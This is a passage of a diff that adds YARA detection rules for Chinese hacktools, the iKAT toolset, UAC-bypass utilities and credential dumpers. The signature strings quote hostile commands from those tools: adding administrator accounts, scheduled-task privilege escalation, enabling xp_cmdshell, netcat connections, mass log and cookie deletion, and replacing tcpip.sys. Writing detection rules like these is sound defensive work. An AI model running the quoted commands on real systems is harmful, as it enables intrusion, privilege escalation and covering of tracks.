+		score = 60
+		date = "12.10.2014"
+	strings:
+		$s0 = "Bf **************" ascii fullword
+		$s1 = "forming Time: %d/" ascii
+		$s2 = "KERNEL32.DLL" ascii fullword
+		$s3 = "CRTDLL.DLL" ascii fullword
+		$s4 = "WS2_32.DLL" ascii fullword
+		$s5 = "GetProcAddress" ascii fullword
+		$s6 = "atoi" ascii fullword
+	condition:
+		all of them
+}
+
+rule CN_Hacktool_1433_Scanner {
+	meta:
+		description = "Detects a chinese MSSQL scanner"
+		author = "Florian Roth"
+		score = 40
+		date = "12.10.2014"
+	strings:
+		$magic = { 4d 5a }
+		$s0 = "1433" wide fullword
+		$s1 = "1433V" wide
+		$s2 = "del Weak1.txt" ascii fullword
+		$s3 = "del Attack.txt" ascii fullword
+		$s4 = "del /s /Q C:\\Windows\\system32\\doors\\" fullword ascii
+		$s5 = "!&start iexplore http://www.crsky.com/soft/4818.html)" fullword ascii
+	condition:
+		( $magic at 0 ) and all of ($s*)
+}
+
+rule CN_Hacktool_1433_Scanner_Comp2 {
+	meta:
+		description = "Detects a chinese MSSQL scanner - component 2"
+		author = "Florian Roth"
+		score = 40
+		date = "12.10.2014"
+	strings:
+		$magic = { 4d 5a }
+		$s0 = "1433" wide fullword
+		$s1 = "1433V" wide
+		$s2 = "UUUMUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUfUUUMUUU" ascii fullword
+	condition:
+		( $magic at 0 ) and all of ($s*)
+}
+
+rule WCE_Modified_1_1014 {
+	meta:
+		description = "Modified (packed) version of Windows Credential Editor"
+		author = "Florian Roth"
+		hash = "09a412ac3c85cedce2642a19e99d8f903a2e0354"
+		score = 70
+	strings:
+		$s0 = "LSASS.EXE" fullword ascii
+		$s1 = "_CREDS" ascii
+		$s9 = "Using WCE " ascii
+	condition:
+		all of them
+}
+
+rule ReactOS_cmd_valid {
+	meta:
+		description = "ReactOS cmd.exe with correct file name - maybe packed with software or part of hacker toolset"
+		author = "Florian Roth"
+		date = "05.11.14"
+		reference = "http://www.elifulkerson.com/articles/suzy-sells-cmd-shells.php"
+		score = 30
+		hash = "b88f050fa69d85af3ff99af90a157435296cbb6e"
+	strings:
+		$s1 = "ReactOS Command Processor" fullword wide
+		$s2 = "Copyright (C) 1994-1998 Tim Norman and others" fullword wide
+		$s3 = "Eric Kohl and others" fullword wide
+		$s4 = "ReactOS Operating System" fullword wide
+	condition:
+		all of ($s*)
+}
+
+rule iKAT_wmi_rundll {
+	meta:
+		description = "This exe will attempt to use WMI to Call the Win32_Process event to spawn rundll - file wmi_rundll.exe"
+		author = "Florian Roth"
+		date = "05.11.14"
+		score = 65
+		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
+		hash = "97c4d4e6a644eed5aa12437805e39213e494d120"
+	strings:
+		$s0 = "This operating system is not supported." fullword ascii
+		$s1 = "Error!" fullword ascii
+		$s2 = "Win32 only!" fullword ascii
+		$s3 = "COMCTL32.dll" fullword ascii
+		$s4 = "[LordPE]" ascii
+		$s5 = "CRTDLL.dll" fullword ascii
+		$s6 = "VBScript" fullword ascii
+		$s7 = "CoUninitialize" fullword ascii
+	condition:
+		all of them and filesize < 15KB
+}
+
+rule iKAT_revelations {
+	meta:
+		description = "iKAT hack tool showing the content of password fields - file revelations.exe"
+		author = "Florian Roth"
+		date = "05.11.14"
+		score = 75
+		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
+		hash = "c4e217a8f2a2433297961561c5926cbd522f7996"
+	strings:
+		$s0 = "The RevelationHelper.DLL file is corrupt or missing." fullword ascii
+		$s8 = "BETAsupport@snadboy.com" fullword wide
+		$s9 = "support@snadboy.com" fullword wide
+		$s14 = "RevelationHelper.dll" fullword ascii
+	condition:
+		all of them
+}
+
+rule iKAT_priv_esc_tasksch {
+	meta:
+		description = "Task Schedulder Local Exploit - Windows local priv-esc using Task Scheduler, published by webDevil. Supports Windows 7 and Vista."
+		author = "Florian Roth"
+		date = "05.11.14"
+		score = 75		
+		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
+		hash = "84ab94bff7abf10ffe4446ff280f071f9702cf8b"
+	strings:
+		$s0 = "objShell.Run \"schtasks /change /TN wDw00t /disable\",,True" fullword ascii
+		$s3 = "objShell.Run \"schtasks /run /TN wDw00t\",,True" fullword ascii
+		$s4 = "'objShell.Run \"cmd /c copy C:\\windows\\system32\\tasks\\wDw00t .\",,True" fullword ascii
+		$s6 = "a.WriteLine (\"schtasks /delete /f /TN wDw00t\")" fullword ascii
+		$s7 = "a.WriteLine (\"net user /add ikat ikat\")" fullword ascii
+		$s8 = "a.WriteLine (\"cmd.exe\")" fullword ascii
+		$s9 = "strFileName=\"C:\\windows\\system32\\tasks\\wDw00t\"" fullword ascii
+		$s10 = "For n = 1 To (Len (hexXML) - 1) step 2" fullword ascii
+		$s13 = "output.writeline \" Should work on Vista/Win7/2008 x86/x64\"" fullword ascii
+		$s11 = "Set objExecObject = objShell.Exec(\"cmd /c schtasks /query /XML /TN wDw00t\")" fullword ascii
+		$s12 = "objShell.Run \"schtasks /create /TN wDw00t /sc monthly /tr \"\"\"+biatchFile+\"" ascii
+		$s14 = "a.WriteLine (\"net localgroup administrators /add v4l\")" fullword ascii		
+		$s20 = "Set ts = fso.createtextfile (\"wDw00t.xml\")" fullword ascii
+	condition:
+		2 of them
+}
+
+rule iKAT_command_lines_agent {
+	meta:
+		description = "iKAT hack tools set agent - file ikat.exe"
+		author = "Florian Roth"
+		date = "05.11.14"
+		score = 75		
+		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
+		hash = "c802ee1e49c0eae2a3fc22d2e82589d857f96d94"
+	strings:
+		$s0 = "Extended Module: super mario brothers" fullword ascii
+		$s1 = "Extended Module: " fullword ascii
+		$s3 = "ofpurenostalgicfeeling" fullword ascii
+		$s8 = "-supermariobrotheretic" fullword ascii
+		$s9 = "!http://132.147.96.202:80" fullword ascii
+		$s12 = "iKAT Exe Template" fullword ascii
+		$s15 = "withadancyflavour.." fullword ascii
+		$s16 = "FastTracker v2.00   " fullword ascii
+	condition:
+		4 of them
+}
+
+rule iKAT_cmd_as_dll {
+	meta:
+		description = "iKAT toolset file cmd.dll ReactOS file cloaked"
+		author = "Florian Roth"
+		date = "05.11.14"
+		score = 65
+		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
+		hash = "b5d0ba941efbc3b5c97fe70f70c14b2050b8336a"
+	strings:
+		$s1 = "cmd.exe" fullword wide
+		$s2 = "ReactOS Development Team" fullword wide
+		$s3 = "ReactOS Command Processor" fullword wide
+		
+		$ext = "extension: .dll" nocase
+	condition:
+		all of ($s*) and $ext 
+}
+
+rule iKAT_tools_nmap {
+	meta:
+		description = "Generic rule for NMAP - based on NMAP 4 standalone"
+		author = "Florian Roth"
+		date = "05.11.14"
+		score = 50
+		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
+		hash = "d0543f365df61e6ebb5e345943577cc40fca8682"
+	strings:
+		$s0 = "Insecure.Org" fullword wide
+		$s1 = "Copyright (c) Insecure.Com" fullword wide
+		$s2 = "nmap" fullword nocase
+		$s3 = "Are you alert enough to be using Nmap?  Have some coffee or Jolt(tm)." ascii
+	condition:
+		all of them
+}
+
+rule iKAT_startbar {
+	meta:
+		description = "Tool to hide unhide the windows startbar from command line - iKAT hack tools - file startbar.exe"
+		author = "Florian Roth"
+		date = "05.11.14"
+		score = 50
+		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
+		hash = "0cac59b80b5427a8780168e1b85c540efffaf74f"
+	strings:
+		$s2 = "Shinysoft Limited1" fullword ascii
+		$s3 = "Shinysoft Limited0" fullword ascii
+		$s4 = "Wellington1" fullword ascii
+		$s6 = "Wainuiomata1" fullword ascii
+		$s8 = "56 Wright St1" fullword ascii
+		$s9 = "UTN-USERFirst-Object" fullword ascii
+		$s10 = "New Zealand1" fullword ascii
+	condition:
+		all of them
+}
+
+rule iKAT_gpdisable_customcmd_kitrap0d_uacpoc {
+	meta:
+		description = "iKAT hack tool set generic rule - from files gpdisable.exe, customcmd.exe, kitrap0d.exe, uacpoc.exe"
+		author = "Florian Roth"
+		date = "05.11.14"
+		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
+		super_rule = 1
+		hash0 = "814c126f21bc5e993499f0c4e15b280bf7c1c77f"
+		hash1 = "2725690954c2ad61f5443eb9eec5bd16ab320014"
+		hash2 = "75f5aed1e719443a710b70f2004f34b2fe30f2a9"
+		hash3 = "b65a460d015fd94830d55e8eeaf6222321e12349"
+		score = 20
+	strings:
+		$s0 = "Failed to get temp file for source AES decryption" fullword
+		$s5 = "Failed to get encryption header for pwd-protect" fullword
+		$s17 = "Failed to get filetime" fullword
+		$s20 = "Failed to delete temp file for password decoding (3)" fullword
+	condition:
+		all of them
+}
+
+rule iKAT_Tool_Generic {
+	meta:
+		description = "Generic Rule for hack tool iKAT files gpdisable.exe, kitrap0d.exe, uacpoc.exe"
+		author = "Florian Roth"
+		date = "05.11.14"
+		score = 55
+		reference = "http://ikat.ha.cked.net/Windows/functions/ikatfiles.html"
+		super_rule = 1
+		hash0 = "814c126f21bc5e993499f0c4e15b280bf7c1c77f"
+		hash1 = "75f5aed1e719443a710b70f2004f34b2fe30f2a9"
+		hash2 = "b65a460d015fd94830d55e8eeaf6222321e12349"
+	strings:
+		$s0 = "<IconFile>C:\\WINDOWS\\App.ico</IconFile>" fullword
+		$s1 = "Failed to read the entire file" fullword
+		$s4 = "<VersionCreatedBy>14.4.0</VersionCreatedBy>" fullword
+		$s8 = "<ProgressCaption>Run &quot;executor.bat&quot; once the shell has spawned.</P"
+		$s9 = "Running Zip pipeline..." fullword
+		$s10 = "<FinTitle />" fullword
+		$s12 = "<AutoTemp>0</AutoTemp>" fullword
+		$s14 = "<DefaultDir>%TEMP%</DefaultDir>" fullword
+		$s15 = "AES Encrypting..." fullword
+		$s20 = "<UnzipDir>%TEMP%</UnzipDir>" fullword
+	condition:
+		all of them
+}
+
+rule BypassUac2 {
+	meta:
+		description = "Auto-generated rule - file BypassUac2.zip"
+		author = "yarGen Yara Rule Generator"
+		hash = "ef3e7dd2d1384ecec1a37254303959a43695df61"
+	strings:
+		$s0 = "/BypassUac/BypassUac/BypassUac_Utils.cpp" fullword ascii
+		$s1 = "/BypassUac/BypassUacDll/BypassUacDll.aps" fullword ascii
+		$s3 = "/BypassUac/BypassUac/BypassUac.ico" fullword ascii
+	condition:
+		all of them
+}
+
+rule BypassUac_3 {
+	meta:
+		description = "Auto-generated rule - file BypassUacDll.dll"
+		author = "yarGen Yara Rule Generator"
+		hash = "1974aacd0ed987119999735cad8413031115ce35"
+	strings:
+		$s0 = "BypassUacDLL.dll" fullword wide
+		$s1 = "\\Release\\BypassUacDll" ascii
+		$s3 = "Win7ElevateDLL" fullword wide
+		$s7 = "BypassUacDLL" fullword wide
+	condition:
+		3 of them
+}
+
+rule BypassUac_9 {
+	meta:
+		description = "Auto-generated rule - file BypassUac.zip"
+		author = "yarGen Yara Rule Generator"
+		hash = "93c2375b2e4f75fc780553600fbdfd3cb344e69d"
+	strings:
+		$s0 = "/x86/BypassUac.exe" fullword ascii
+		$s1 = "/x64/BypassUac.exe" fullword ascii
+		$s2 = "/x86/BypassUacDll.dll" fullword ascii
+		$s3 = "/x64/BypassUacDll.dll" fullword ascii
+		$s15 = "BypassUac" fullword ascii
+	condition:
+		all of them
+}
+
+rule BypassUacDll_6 {
+	meta:
+		description = "Auto-generated rule - file BypassUacDll.aps"
+		author = "yarGen Yara Rule Generator"
+		hash = "58d7b24b6870cb7f1ec4807d2f77dd984077e531"
+	strings:
+		$s3 = "BypassUacDLL.dll" fullword wide
+		$s4 = "AFX_IDP_COMMAND_FAILURE" fullword ascii
+	condition:
+		all of them
+}
+
+rule BypassUacDll_7 {
+	meta:
+		description = "Auto-generated rule - file BypassUacDll.aps"
+		author = "yarGen Yara Rule Generator"
+		hash = "58d7b24b6870cb7f1ec4807d2f77dd984077e531"
+	strings:
+		$s3 = "BypassUacDLL.dll" fullword wide
+		$s4 = "AFX_IDP_COMMAND_FAILURE" fullword ascii
+	condition:
+		all of them
+}
+
+rule BypassUac_EXE {
+	meta:
+		description = "Auto-generated rule - file BypassUacDll.aps"
+		author = "yarGen Yara Rule Generator"
+		hash = "58d7b24b6870cb7f1ec4807d2f77dd984077e531"
+	strings:
+		$s1 = "Wole32.dll" wide
+		$s3 = "System32\\migwiz" wide
+		$s4 = "System32\\migwiz\\CRYPTBASE.dll" wide
+		$s5 = "Elevation:Administrator!new:" wide
+		$s6 = "BypassUac" wide
+	condition:
+		all of them
+}
+
+rule APT_Proxy_Malware_Packed_dev
+{
+	meta:
+		author = "FRoth"
+		date = "2014-11-10"
+		description = "APT Malware - Proxy"
+		hash = "6b6a86ceeab64a6cb273debfa82aec58"
+		score = 50
+	strings:
+		$string0 = "PECompact2" fullword
+		$string1 = "[LordPE]"
+		$string2 = "steam_ker.dll"
+	condition:
+		all of them
+}
+
+rule Tzddos_DDoS_Tool_CN {
+	meta:
+		description = "Disclosed hacktool set - file tzddos"
+		author = "Florian Roth"
+		date = "17.11.14"
+		score = 60
+		hash = "d4c517eda5458247edae59309453e0ae7d812f8e"
+	strings:
+		$s0 = "for /f %%a in (host.txt) do (" fullword ascii
+		$s1 = "for /f \"eol=S tokens=1 delims= \" %%i in (s2.txt) do echo %%i>>host.txt" fullword ascii
+		$s2 = "del host.txt /q" fullword ascii
+		$s3 = "for /f \"eol=- tokens=1 delims= \" %%i in (result.txt) do echo %%i>>s1.txt" fullword ascii
+		$s4 = "start Http.exe %%a %http%" fullword ascii
+		$s5 = "for /f \"eol=P tokens=1 delims= \" %%i in (s1.txt) do echo %%i>>s2.txt" fullword ascii
+		$s6 = "del Result.txt s2.txt s1.txt " fullword ascii
+	condition:
+		all of them
+}
+
+rule Ncat_Hacktools_CN {
+	meta:
+		description = "Disclosed hacktool set - file nc.exe"
+		author = "Florian Roth"
+		date = "17.11.14"
+		score = 60
+		hash = "001c0c01c96fa56216159f83f6f298755366e528"
+	strings:
+		$s0 = "nc -l -p port [options] [hostname] [port]" fullword ascii
+		$s2 = "nc [-options] hostname port[s] [ports] ... " fullword ascii
+		$s3 = "gethostpoop fuxored" fullword ascii
+		$s6 = "VERNOTSUPPORTED" fullword ascii
+		$s7 = "%s [%s] %d (%s)" fullword ascii
+		$s12 = " `--%s' doesn't allow an argument" fullword ascii
+	condition:
+		all of them
+}
+
+rule MS08_067_Exploit_Hacktools_CN {
+	meta:
+		description = "Disclosed hacktool set - file cs.exe"
+		author = "Florian Roth"
+		date = "17.11.14"
+		score = 60
+		hash = "a3e9e0655447494253a1a60dbc763d9661181322"
+	strings:
+		$s0 = "MS08-067 Exploit for CN by EMM@ph4nt0m.org" fullword ascii
+		$s3 = "Make SMB Connection error:%d" fullword ascii
+		$s5 = "Send Payload Over!" fullword ascii
+		$s7 = "Maybe Patched!" fullword ascii
+		$s8 = "RpcExceptionCode() = %u" fullword ascii
+		$s11 = "ph4nt0m" fullword wide
+		$s12 = "\\\\%s\\IPC$" fullword ascii
+	condition:
+		4 of them
+}
+
+rule Hacktools_CN_Burst_sql {
+	meta:
+		description = "Disclosed hacktool set - file sql.exe"
+		author = "Florian Roth"
+		date = "17.11.14"
+		score = 60
+		hash = "d5139b865e99b7a276af7ae11b14096adb928245"
+	strings:
+		$s0 = "s.exe %s %s %s %s %d /save" fullword ascii
+		$s2 = "s.exe start error...%d" fullword ascii
+		$s4 = "EXEC sp_addextendedproc xp_cmdshell,'xplog70.dll'" fullword ascii
+		$s7 = "EXEC master..xp_cmdshell 'wscript.exe cc.js'" fullword ascii
+		$s10 = "Result.txt" fullword ascii
+		$s11 = "Usage:sql.exe [options]" fullword ascii
+		$s17 = "%s root %s %d error" fullword ascii
+		$s18 = "Pass.txt" fullword ascii
+		$s20 = "SELECT sillyr_at_gmail_dot_com INTO DUMPFILE '%s\\\\sillyr_x.so' FROM sillyr_x" fullword ascii
+	condition:
+		6 of them
+}
+
+rule Hacktools_CN_JoHor_Rdos {
+	meta:
+		description = "Disclosed hacktool set - file spec.vbp"
+		author = "Florian Roth"
+		date = "17.11.14"
+		score = 60
+		hash = "400a90c9eabeb94ae05e5036e21dc922b0c1ffad"
+	strings:
+		$s3 = "service@dywt.com.cn" fullword ascii
+		$s9 = "www.dywt.com.cn" fullword ascii
+		$s17 = "This is a runtime library file for EPL applications. The EPL is a software devel" ascii
+	condition:
+		2 of them
+}
+
+rule Hacktools_CN_Panda_445TOOL {
+	meta:
+		description = "Disclosed hacktool set - file 445TOOL.rar"
+		author = "Florian Roth"
+		date = "17.11.14"
+		score = 60
+		hash = "92050ba43029f914696289598cf3b18e34457a11"
+	strings:
+		$s0 = "scan.bat" fullword ascii
+		$s1 = "Http.exe" fullword ascii
+		$s2 = "GOGOGO.bat" fullword ascii
+		$s3 = "ip.txt" fullword ascii
+	condition:
+		all of them
+}
+
+rule Hacktools_CN_Panda_445 {
+	meta:
+		description = "Disclosed hacktool set - file 445.rar"
+		author = "Florian Roth"
+		date = "17.11.14"
+		score = 60
+		hash = "a61316578bcbde66f39d88e7fc113c134b5b966b"
+	strings:
+		$s0 = "for /f %%i in (ips.txt) do (start cmd.bat %%i)" fullword ascii
+		$s1 = "445\\nc.exe" fullword ascii
+		$s2 = "445\\s.exe" fullword ascii
+		$s3 = "cs.exe %1" fullword ascii
+		$s4 = "445\\cs.exe" fullword ascii
+		$s5 = "445\\ip.txt" fullword ascii
+		$s6 = "445\\cmd.bat" fullword ascii
+		$s9 = "@echo off" fullword ascii
+	condition:
+		all of them
+}
+
+rule Hacktools_CN_WinEggDrop {
+	meta:
+		description = "Disclosed hacktool set - file s.exe"
+		author = "Florian Roth"
+		date = "17.11.14"
+		score = 60
+		hash = "7665011742ce01f57e8dc0a85d35ec556035145d"
+	strings:
+		$s0 = "Normal Scan: About To Scan %u IP For %u Ports Using %d Thread" fullword ascii
+		$s2 = "SYN Scan: About To Scan %u IP For %u Ports Using %d Thread" fullword ascii
+		$s6 = "Example: %s TCP 12.12.12.12 12.12.12.254 21 512 /Banner" fullword ascii
+		$s8 = "Something Wrong About The Ports" fullword ascii
+		$s9 = "Performing Time: %d/%d/%d %d:%d:%d --> " fullword ascii
+		$s10 = "Example: %s TCP 12.12.12.12/24 80 512 /T8 /Save" fullword ascii
+		$s12 = "%u Ports Scanned.Taking %d Threads " fullword ascii
+		$s13 = "%-16s %-5d -> \"%s\"" fullword ascii
+		$s14 = "SYN Scan Can Only Perform On WIN 2K Or Above" fullword ascii
+		$s17 = "SYN Scan: About To Scan %s:%d Using %d Thread" fullword ascii
+		$s18 = "Scan %s Complete In %d Hours %d Minutes %d Seconds. Found %u Open Ports" fullword ascii
+	condition:
+		5 of them
+}
+
+rule Hacktools_CN_Scan_BAT {
+	meta:
+		description = "Disclosed hacktool set - file scan.bat"
+		author = "Florian Roth"
+		date = "17.11.14"
+		score = 60
+		hash = "6517d7c245f1300e42f7354b0fe5d9666e5ce52a"
+	strings:
+		$s0 = "for /f %%a in (host.txt) do (" fullword ascii
+		$s1 = "for /f \"eol=S tokens=1 delims= \" %%i in (s2.txt) do echo %%i>>host.txt" fullword ascii
+		$s2 = "del host.txt /q" fullword ascii
+		$s3 = "for /f \"eol=- tokens=1 delims= \" %%i in (result.txt) do echo %%i>>s1.txt" fullword ascii
+		$s4 = "start Http.exe %%a %http%" fullword ascii
+		$s5 = "for /f \"eol=P tokens=1 delims= \" %%i in (s1.txt) do echo %%i>>s2.txt" fullword ascii
+	condition:
+		5 of them
+}
+
+rule Hacktools_CN_Panda_Burst {
+	meta:
+		description = "Disclosed hacktool set - file Burst.rar"
+		author = "Florian Roth"
+		date = "17.11.14"
+		score = 60
+		hash = "ce8e3d95f89fb887d284015ff2953dbdb1f16776"
+	strings:
+		$s0 = "@sql.exe -f ip.txt -m syn -t 3306 -c 5000 -u http://60.15.124.106:63389/tasksvr." ascii
+	condition:
+		all of them
+}
+
+rule Hacktools_CN_445_cmd {
+	meta:
+		description = "Disclosed hacktool set - file cmd.bat"
+		author = "Florian Roth"
+		date = "17.11.14"
+		score = 60
+		hash = "69b105a3aec3234819868c1a913772c40c6b727a"
+	strings:
+		$bat = "@echo off" fullword ascii
+		$s0 = "cs.exe %1" fullword ascii
+		$s2 = "nc %1 4444" fullword ascii
+	condition:
+		$bat at 0 and all of ($s*)
+}
+
+rule Hacktools_CN_GOGOGO_Bat {
+	meta:
+		description = "Disclosed hacktool set - file GOGOGO.bat"
+		author = "Florian Roth"
+		date = "17.11.14"
+		score = 60
+		hash = "4bd4f5b070acf7fe70460d7eefb3623366074bbd"
+	strings:
+		$s0 = "for /f \"delims=\" %%x in (endend.txt) do call :lisoob %%x" fullword ascii
+		$s1 = "http://www.tzddos.com/ -------------------------------------------->byebye.txt" fullword ascii
+		$s2 = "ren %systemroot%\\system32\\drivers\\tcpip.sys tcpip.sys.bak" fullword ascii
+		$s4 = "IF /I \"%wangle%\"==\"\" ( goto start ) else ( goto erromm )" fullword ascii
+		$s5 = "copy *.tzddos scan.bat&del *.tzddos" fullword ascii
+		$s6 = "del /f tcpip.sys" fullword ascii
+		$s9 = "if /i \"%CB%\"==\"www.tzddos.com\" ( goto mmbat ) else ( goto wangle )" fullword ascii
+		$s10 = "call scan.bat" fullword ascii
+		$s12 = "IF /I \"%erromm%\"==\"\" ( goto start ) else ( goto zuihoujh )" fullword ascii
+		$s13 = "IF /I \"%zuihoujh%\"==\"\" ( goto start ) else ( goto laji )" fullword ascii
+		$s18 = "sc config LmHosts start= auto" fullword ascii
+		$s19 = "copy tcpip.sys %systemroot%\\system32\\drivers\\tcpip.sys > nul" fullword ascii
+		$s20 = "ren %systemroot%\\system32\\dllcache\\tcpip.sys tcpip.sys.bak" fullword ascii
+	condition:
+		3 of them
+}
+
+rule Hacktools_CN_Burst_pass {
+	meta:
+		description = "Disclosed hacktool set - file pass.txt"
+		author = "Florian Roth"
+		date = "17.11.14"
+		score = 60
+		hash = "55a05cf93dbd274355d798534be471dff26803f9"
+	strings:
+		$s0 = "123456.com" fullword ascii
+		$s1 = "123123.com" fullword ascii
+		$s2 = "360.com" fullword ascii
+		$s3 = "123.com" fullword ascii
+		$s4 = "juso.com" fullword ascii
+		$s5 = "sina.com" fullword ascii
+		$s7 = "changeme" fullword ascii
+		$s8 = "master" fullword ascii
+		$s9 = "google.com" fullword ascii
+		$s10 = "chinanet" fullword ascii
+		$s12 = "lionking" fullword ascii
+	condition:
+		all of them
+}
+
+rule Hacktools_CN_JoHor_Posts_Killer {
+	meta:
+		description = "Disclosed hacktool set - file JoHor_Posts_Killer.exe"
+		author = "Florian Roth"
+		date = "17.11.14"
+		score = 60
+		hash = "d157f9a76f9d72dba020887d7b861a05f2e56b6a"
+	strings:
+		$s0 = "Multithreading Posts_Send Killer" fullword ascii
+		$s3 = "GET [Access Point] HTTP/1.1" fullword ascii
+		$s6 = "The program's need files was not exist!" fullword ascii
+		$s7 = "JoHor_Posts_Killer" fullword wide
+		$s8 = "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" fullword ascii
+		$s10 = "  ( /s ) :" fullword ascii
+		$s11 = "forms.vbp" fullword ascii
+		$s12 = "forms.vcp" fullword ascii
+		$s13 = "Software\\FlySky\\E\\Install" fullword ascii
+	condition:
+		5 of them
+}
+
+rule Hacktools_CN_JoHor_Rdos_3_6_uplis {
+	meta:
+		description = "Disclosed hacktool set - file uplis.vbp"
+		author = "Florian Roth"
+		date = "17.11.14"
+		score = 60
+		hash = "a87d00d78838c2d968b72330ee6f21f69b2caae5"
+	strings:
+		$s0 = "http://dywt.com.cn" fullword ascii
+		$s1 = "service@dywt.com.cn" fullword ascii
+		$s4 = "GetNewInf" fullword ascii
+		$s5 = "This is a runtime library file for EPL applications. The EPL is a software devel" ascii
+		$s8 = "yiyuyan" fullword ascii
+	condition:
+		4 of them
+}
+
+rule Hacktools_CN_Panda_tesksd {
+	meta:
+		description = "Disclosed hacktool set - file tesksd.jpg"
+		author = "Florian Roth"
+		date = "17.11.14"
+		score = 60
+		hash = "922147b3e1e6cf1f5dd5f64a4e34d28bdc9128cb"
+	strings:
+		$s0 = "name=\"Microsoft.Windows.Common-Controls\" " fullword ascii
+		$s1 = "ExeMiniDownload.exe" fullword wide
+		$s16 = "POST %Hs" fullword ascii
+	condition:
+		all of them
+}
+
+rule Hacktools_CN_Panda_k {
+	meta:
+		description = "Disclosed hacktool set - file k.exe"
+		author = "Florian Roth"
+		date = "17.11.14"
+		score = 60
+		hash = "8d1170df533238ac2da7826bd8997917be1e1517"
+	strings:
+		$s0 = "(http://www.eyuyan.com)" fullword wide
+		$s1 = "trin" fullword wide
+		$s2 = "FAUL" fullword wide
+		$s10 = " program must be run " fullword ascii
+	condition:
+		all of them
+}
+
+rule Hacktools_CN_Http {
+	meta:
+		description = "Disclosed hacktool set - file Http.exe"
+		author = "Florian Roth"
+		date = "17.11.14"
+		score = 60
+		hash = "788bf0fdb2f15e0c628da7056b4e7b1a66340338"
+	strings:
+		$s0 = "RPCRT4.DLL" fullword ascii
+		$s1 = "WNetAddConnection2A" fullword ascii
+		$s2 = "NdrPointerBufferSize" fullword ascii
+		$s3 = "_controlfp" fullword ascii
+	condition:
+		all of them and filesize < 10KB
+}
+
+rule Hacktools_CN_JoHor_Rdos_get {
+	meta:
+		description = "Disclosed hacktool set - file get.vbp"
+		author = "Florian Roth"
+		date = "17.11.14"
+		score = 60
+		hash = "09c32ca167136a17fd69df8c525ea5ffeca6c534"
+	strings:
+		$s1 = "http://dywt.com.cn" fullword ascii
+		$s2 = "service@dywt.com.cn" fullword ascii
+		$s3 = "Uncompress" fullword ascii
+		$s5 = "GetNewInf" fullword ascii
+		$s6 = "This is a runtime library file for EPL applications. The EPL is a software devel" ascii
+		$s10 = "GetMD5" fullword ascii
+		$s12 = "RSACheck" fullword ascii
+	condition:
+		all of them
+}
+
+rule Hacktools_CN_JoHor_Rdos_LineExp {
+	meta:
+		description = "Disclosed hacktool set - file LineExp.vbp"
+		author = "Florian Roth"
+		date = "17.11.14"
+		score = 60
+		hash = "1bd2db477c68cdcba9ae5c3668bd76c51fc12d2e"
+	strings:
+		$s0 = "http://dywt.com.cn" fullword ascii
+		$s1 = "service@dywt.com.cn" fullword ascii
+		$s2 = "EThread.fne" fullword ascii
+		$s3 = "GetNewInf" fullword ascii
+		$s4 = "This is a runtime library file for EPL applications. The EPL is a software devel" ascii
+		$s5 = "CloseThreadHandle" fullword ascii
+		$s6 = "WaitThread" fullword ascii
+		$s8 = "CreateCriticalSection" fullword ascii
+	condition:
+		all of them
+}
+
+rule Hacktools_CN_Burst_Start {
+	meta:
+		description = "Disclosed hacktool set - file Start.bat - DoS tool"
+		author = "Florian Roth"
+		date = "17.11.14"
+		score = 60
+		hash = "75d194d53ccc37a68286d246f2a84af6b070e30c"
+	strings:
+		$s0 = "for /f \"eol= tokens=1,2 delims= \" %%i in (ip.txt) do (" fullword ascii
+		$s1 = "Blast.bat /r 600" fullword ascii
+		$s2 = "Blast.bat /l Blast.bat" fullword ascii
+		$s3 = "Blast.bat /c 600" fullword ascii
+		$s4 = "start Clear.bat" fullword ascii
+		$s5 = "del Result.txt" fullword ascii
+		$s6 = "s syn %%i %%j 3306 /save" fullword ascii
+		$s7 = "start Thecard.bat" fullword ascii
+		$s10 = "setlocal enabledelayedexpansion" fullword ascii
+	condition:
+		5 of them
+}
+
+rule Hacktools_CN_Panda_tasksvr {
+	meta:
+		description = "Disclosed hacktool set - file tasksvr.exe"
+		author = "Florian Roth"
+		date = "17.11.14"
+		score = 60
+		hash = "a73fc74086c8bb583b1e3dcfd326e7a383007dc0"
+	strings:
+		$s2 = "Consys21.dll" fullword ascii
+		$s4 = "360EntCall.exe" fullword wide
+		$s15 = "Beijing1" fullword ascii
+	condition:
+		all of them
+}
+rule Hacktools_CN_Burst_Clear {
+	meta:
+		description = "Disclosed hacktool set - file Clear.bat"
+		author = "Florian Roth"
+		date = "17.11.14"
+		score = 60
+		hash = "148c574a4e6e661aeadaf3a4c9eafa92a00b68e4"
+	strings:
+		$s0 = "del /f /s /q %systemdrive%\\*.log    " fullword ascii
+		$s1 = "del /f /s /q %windir%\\*.bak    " fullword ascii
+		$s4 = "del /f /s /q %systemdrive%\\*.chk    " fullword ascii
+		$s5 = "del /f /s /q %systemdrive%\\*.tmp    " fullword ascii
+		$s8 = "del /f /q %userprofile%\\COOKIES s\\*.*    " fullword ascii
+		$s9 = "rd /s /q %windir%\\temp & md %windir%\\temp    " fullword ascii
+		$s11 = "del /f /s /q %systemdrive%\\recycled\\*.*    " fullword ascii
+		$s12 = "del /f /s /q \"%userprofile%\\Local Settings\\Temp\\*.*\"    " fullword ascii
+		$s19 = "del /f /s /q \"%userprofile%\\Local Settings\\Temporary Internet Files\\*.*\"   " ascii
+	condition:
+		5 of them
+}
+
+rule Hacktools_CN_Panda_andrew {
+	meta:
+		description = "Disclosed hacktool set - file andrew.exe - sethc.exe Debugger backdoor"
+		author = "Florian Roth"
+		date = "17.11.14"
+		score = 60
+		hash = "abd03ebb08314297b83e6c795cc85bb85e1f4d71"
+	strings:
+		$s0 = "(http://www.eyuyan.com)" fullword wide
+		$s1 = "ClosePrinter" fullword ascii
+		$s18 = "version=\"1.0\" encoding" fullword ascii
+	condition:
+		all of them
+}
+
+rule Hacktools_CN_Burst_Thecard {
+	meta:
+		description = "Disclosed hacktool set - file Thecard.bat"
+		author = "Florian Roth"
+		date = "17.11.14"
+		score = 60
+		hash = "50b01ea0bfa5ded855b19b024d39a3d632bacb4c"
+	strings:
